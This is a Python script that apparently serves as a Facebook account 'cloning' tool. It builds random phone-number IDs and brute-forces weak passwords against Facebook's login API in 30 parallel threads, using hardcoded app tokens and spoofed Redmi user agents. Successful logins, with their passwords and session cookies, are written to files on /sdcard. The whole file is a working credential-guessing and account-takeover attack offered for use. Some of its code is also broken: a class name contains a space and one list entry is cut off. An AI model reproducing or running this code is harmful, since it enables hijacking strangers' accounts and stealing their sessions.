#=====[🌿]CREATOR : MAAZ KING
#=====[🌿]TELIGERM : @LabbaikSupport

import os
import sys
import json
import uuid
import string
import random
import requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ===== COLOR CODES =====
R = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;226m'
B = '\x1b[38;5;44m'
P = '\x1b[38;5;201m'
W = '\x1b[0;97m'
N = '\x1b[0m'

class MAAZ KING:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.generated_ids = []

    def banner(self):
        os.system("clear")
        os.system("xdg-open https://facebook.com/groups/1036123894351028/")
        print(f"""{G}
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
""")
        print(f"""{G}
╔══════════════════════════════════╗
║ • Creator  : MAAZ KING           ║
║ • Tools    : MAAZ TOOL           ║
║ • Version  : v2.0                ║
║ • Status   : Free                ║
╚══════════════════════════════════╝{N}
""")
        print(f"{W}USE AT YOUR OWN RISK | EDUCATIONAL PURPOSE ONLY\n{N}")

    def Main(self):
        self.banner()
        code = input(f"{Y}ENTER SIM CODE ➤ {G}")
        try:
            limit = int(input(f"{Y}ENTER ID LIMIT ➤ {G}"))
        except ValueError:
            print(f"{R}LIMIT MUST BE A NUMBER{N}")
            return
        for _ in range(limit):
            rand_id = ''.join(random.choices(string.digits, k=8))
            self.generated_ids.append(code + rand_id)

        print(f"\n{B}STARTING CLONING... PLEASE WAIT{N}")
        print(f"{B}USE FLIGHT MODE IF NO RESPONSE\n{'-'*40}{N}")
        
        with ThreadPool(max_workers=30) as pool:
            for uid in self.generated_ids:
                passwords = [
                    uid, uid[:8], uid[:7], uid[:6],
                    uid[-8:], uid[-7:], uid[-6:],
                    "i love you", "ff lover"
                ]
                pool.submit(self.method, uid, passwords)

        print(f"\n{Y}{'-'*40}")
        print(f"{G}CLONING FINISHED! OK: {len(self.oks)} | CP: {len(self.cps)}{N}")
        print(f"{Y}CHECK /sdcard FOR RESULTS{N}")

    def method(self, uid, passlist):
        sys.stdout.write(f"\r{W}MAAZ-TOOL-XD {self.loop} | OK: {G}{len(self.oks)}{W} | CP: {Y}{len(self.cps)}{N} ")
        sys.stdout.flush()
        try:
            for pw in passlist:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': pw,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                }
                headers = {
                    'User-Agent': best_redmi_ua(),
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=random;pid=Main;',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'random-token'
                }
                url = "https://api.facebook.com/auth/login"
                response = requests.post(url, data=data, headers=headers).json()

                if "access_token" in response:
                    uid_logged = str(response.get("uid", uid))
                    year = get_year_from_uid(uid_logged)
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response.get("session_cookies", []))
                    print(f"\r{G}[MAAZ-TOOL-OK] {uid_logged} | {pw} | YEAR: {year}{N}")
                    print(f"{P}COOKIE ➤ {coki}{N}")
                    with open("/sdcard/MAAZ-TOOL-OK.txt", "a") as ok_file:
                        ok_file.write(f"{uid_logged}|{pw}|YEAR: {year}|{coki}\n")
                    self.oks.append(uid_logged)
                    break

                elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                    print(f"\r{Y}[MAAZ-TOOL-CP] {uid} | {pw}{N}")
                    with open("/sdcard/MAAZ-TOOL-CP.txt", "a") as cp_file:
                        cp_file.write(f"{uid}|{pw}\n")
                    self.cps.append(uid)
                    break

            self.loop += 1
        except Exception:
            pass

def get_year_from_uid(uid):
    uid = str(uid)
    if len(uid) == 15:
        if uid[:5] in ["10000", "10001", "10002"]:
            return "2008-2010"
        elif uid[:5] in ["10003", "10004", "10005"]:
            return "2011-2013"
        elif uid[:5] in ["10006", "10007"]:
            return "2014-2016"
        elif uid[:5] in ["10008", "10009"]:
            return "2017-2020"
        else:
            return "2021+"
    elif len(uid) == 14:
        return "2007-2008"
    elif len(uid) == 13:
        return "2006-2007"
    else:
        return "Unknown"

def best_redmi_ua():
    models = [
        {"model": "Redmi Note 13", "code": "2312DRAABC", "android": "13", "res": (1080, 2400)},
        {"model": "Redmi 12", "code": "23053RN02L", "android": "13", "res": (1080, 2460)},
        {"model": "Redmi Note 11", "code": "2109119DG", "android": "13", "res":
        {"model": "Redmi Note 10", "code": "M2101K7AG", "android": "12", "res": (1080, 2400)},
        {"model": "Redmi 10", "code": "21061119AG", "android": "11", "res": (1080, 2400)},
        {"model": "Redmi 9", "code": "Lancelot", "android": "10", "res": (720, 1600)},
        {"model": "Redmi Note 8", "code": "Ginkgo", "android": "10", "res": (1080, 2340)},
        {"model": "Redmi Note 7", "code": "Lavender", "android": "10", "res": (1080, 2340)},
        {"model": "Redmi Note 6 Pro", "code": "Tulip", "android": "9", "res": (1080, 2280)},
        {"model": "Redmi 6", "code": "cereus", "android": "9", "res": (720, 1440)},
    ]
    m = random.choice(models)
    density = round(random.uniform(2.0, 3.5), 2)
    w, h = m["res"]
    return (
        f"[FBAN/FB4A;FBAV/{random.randint(300, 450)}.0.0.{random.randint(1, 30)}.{random.randint(50, 150)};"
        f"FBBV/{random.randint(200000000, 399999999)};"
        f"FBDM={{density={density},width={w},height={h}}};"
        f"FBLC/bn_BD;FBRV/{random.randint(200000000, 400000000)};FBCR/Grameenphone;FBMF/Xiaomi;"
        f"FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{m['code']};"
        f"FBSV/{m['android']};FBOP/1;FBCA/arm64-v8a;]"
    )

if __name__ == "__main__":
    MAAZ KING().Main()
         
